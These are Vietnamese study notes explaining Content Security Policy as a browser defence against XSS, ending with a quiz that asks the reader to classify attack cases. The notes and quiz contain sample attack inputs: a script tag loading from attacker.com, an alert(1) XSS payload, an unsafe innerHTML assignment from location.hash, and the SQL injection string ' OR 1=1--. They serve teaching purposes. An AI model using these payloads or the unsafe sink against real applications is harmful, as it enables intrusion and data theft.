

### 1. CSP là gì?
**CSP (Content Security Policy)** là một cơ chế của trình duyệt để giới hạn **JavaScript và tài nguyên nào được phép chạy**.

<u>Ví dụ 1</u> server gửi:
```http
Content-Security-Policy: script-src 'self'
```
   -Nghĩa là:
```text
JavaScript
│
├── Từ chính website ('self') → Được phép
└── Từ website khác → Bị chặn
```
   -Nếu ứng dụng có XSS:
```text
XSS vulnerability
        ↓
CSP kiểm soát
        ↓
Payload có thể bị chặn
```

<u>Ví dụ 2:</u>
```html
<script src="https://attacker.com/x.js"></script>
```

   -Nếu CSP chỉ cho phép:

```text
script-src 'self'
```

   -thì script từ `attacker.com` bị chặn.

**Nhưng CSP không sửa lỗ hổng XSS.** Nó chỉ là một **lớp phòng thủ bổ sung**. Nếu cấu hình CSP yếu hoặc có cách bypass, XSS vẫn có thể bị khai thác.

> *chốt lại những điều cần nhớ:*
> 	- **CSP**: là một lớp giúp <u>ngăn chặn</u> *mã js/ tài nguyên* <u>chạy từ nguồn ko tin cậy</u>
> 	- *CSP nhìn như nào?? và nó ở đâu??* -> nó nằm trong phần header của http 
>đọc trong phần này [[các thành phần bên trong gói tin http request]]


## Bài tập kiểm tra

Phân loại các tình huống sau:

**A.**
```html
<script>alert(1)</script>
```
được server trả lại trong response và chạy trong browser.

**B.**

```javascript
element.innerHTML = location.hash;
```

**C.**  -> 
Input phá vỡ cấu trúc HTML và khiến dữ liệu phía sau bị gửi tới server attacker, nhưng không thực thi JavaScript.

**D.**
Input: -> sql injecttion
```sql
' OR 1=1--
```
được đưa vào câu SQL của server.

Hãy trả lời:
```text
A = ?
B = ?
C = ?
D = ?
```